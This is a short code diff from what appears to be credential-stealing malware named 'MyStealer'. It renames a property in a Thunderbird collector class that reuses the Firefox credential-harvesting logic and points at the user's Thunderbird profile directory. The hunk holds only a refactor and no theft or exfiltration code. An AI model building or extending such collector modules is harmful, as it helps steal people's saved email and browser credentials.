@@ -7,7 +7,7 @@ namespace MyStealer.Collector.Browser.FirefoxBased
     // but its credential storage is working in exactly same way with the firefox's one
     public class Thunderbird : Firefox
     {
-        public override string ModuleName => "Thunderbird";
+        public override string Name => "Thunderbird";
 
         protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird", "Profiles");
 
